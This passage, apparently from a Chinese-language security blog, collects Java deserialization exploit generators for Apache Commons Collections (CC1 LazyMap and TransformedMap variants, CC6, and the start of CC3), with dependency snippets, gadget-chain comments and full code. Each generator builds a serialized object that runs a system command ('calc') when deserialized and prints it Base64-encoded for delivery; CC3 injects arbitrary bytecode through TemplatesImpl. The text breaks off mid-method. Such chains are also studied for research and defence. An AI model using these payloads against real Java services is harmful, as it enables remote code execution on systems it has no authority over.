class_">HashMap</span>&lt;&gt;(),chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AnnotationInvocationHandler构造方法是default，不能直接获取，反射</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 创建动态代理对象，这里不用进入AnnotationInvocationHandler的if判断，第一个参数就可以随便传</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 被动态代理的对象调用任意方法都会调用对应的代理类的invoke方法，AnnotationInvocationHandler.invoke() -&gt; LazyMap.get()</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invocationHandler);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 实例化AnnotationInvocationHandler</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(obj)));</span><br><span class="line">        deserialize(serialize(obj));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CC1-TransformedMap"><a href="#CC1-TransformedMap" class="headerlink" title="CC1_TransformedMap"></a>CC1_TransformedMap</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">```java</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">    Dependent version:</span><br><span class="line">    commons-collections: 3.1</span><br><span class="line">    Jdk &lt; 8u71</span><br><span class="line"></span><br><span class="line">Gadget chain:</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">AnnotationInvocationHandler.setValue()</span><br><span class="line">    TransformedMap.checkSetValue()</span><br><span class="line">    ChainedTransformer.transform()</span><br><span class="line">    ConstantTransformer.transform()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">public class CommonsCollections1_TransformedMap &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 这里HashMap的key是下面初始化AnnotationInvocationHandler时传入的注解类中存在的属性值</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;,&quot;0&quot;);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // AnnotationInvocationHandler是default，不能直接获取，反射</span><br><span class="line">        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor  constructor = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        // 这里要进入AnnotationInvocationHandler的if判断</span><br><span class="line">        Object obj = constructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(obj)));</span><br><span class="line">        deserialize(serialize(obj));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void deserialize(byte[] bytes) throws Exception &#123;</span><br><span class="line">        ByteArrayInputStream bis = new ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        return byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Dependent version:</span></span><br><span class="line"><span class="comment">        commons-collections: 3.1～3.2.1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">        HashMap.readObject()</span></span><br><span class="line"><span class="comment">            HashMap.put()</span></span><br><span class="line"><span class="comment">                HashMap.hash()</span></span><br><span class="line"><span class="comment">                    TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                        TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                            LazyMap.get()</span></span><br><span class="line"><span class="comment">                                ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                                    ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                                    InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化put时使他不能触发，先给一个无用值，最后反射修改</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),<span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="comment">// put触发hash，hashCode方法计算时会在hashCode属性中缓存已经计算过的值，如果再次计算将直接返回值，所以需要删除其key</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(tiedMapEntry,<span class="string">&quot;map&quot;</span>,lazyMap);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(hashMap)));</span><br><span class="line">        deserialize(serialize(hashMap));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object val)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.22.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment">Dependent version:    </span></span><br><span class="line"><span class="comment">commons-collections: 3.1 - 3.2.1    </span></span><br><span class="line"><span class="comment">    javassist &gt;= 3.20.0-GA (unnecessary)    </span></span><br><span class="line"><span class="comment">    Jdk &lt; 8u71  </span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Gadget chain:       </span></span><br><span class="line"><span class="comment">    AnnotationInvocationHandler.readObject()          </span></span><br><span class="line"><span class="comment">    Map(Proxy).entrySet()             </span></span><br><span class="line"><span class="comment">    AnnotationInvocationHandler.invoke()                </span></span><br><span class="line"><span class="comment">    LazyMap.get()                   </span></span><br><span class="line"><span class="comment">    ChainedTransformer.transform()                      </span></span><br><span class="line"><span class="comment">    ConstantTransformer.transform()                      </span></span><br><span class="line"><span class="comment">InstantiateTransformer.transform()                          </span></span><br><span class="line"><span class="comment">    TrAXFilter.newInstance()                                    </span></span><br><span class="line"><span class="comment">    TemplatesImpl.newTransformer() </span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;2&quot;</span>);  </span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);  </span><br><span class="line">        <span class="comment">//byte[] code = Files.readAllBytes(Paths.get(&quot;/Users/n2ryx/Documents/Compiler/IDEA/Payloads/target/classes/cc/Evil.class&quot;));  </span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getByteCodes()&#125;);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// InstantiateTransformer.transform() -&gt; TrAXFilter.TrAXFilter() -&gt; TemplatesImpl.newTransformer()  </span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// AnnotationInvocationHandler构造方法是default，不能直接获取，反射  </span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);  </span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="comment">// 创建动态代理对象，这里不用进入AnnotationInvocationHandler的if判断，第一个参数就可以随便传  </span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 被动态代理的对象调用任意方法都会调用对应的代理类的invoke方法，AnnotationInvocationHandler.invoke() -&gt; LazyMap.get()  </span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invocationHandler);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 实例化AnnotationInvocationHandler  </span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapProxy);  </span><br><span class="line">  </span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(obj)));  </span><br><span class="line">        deserialize(serialize(obj));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> 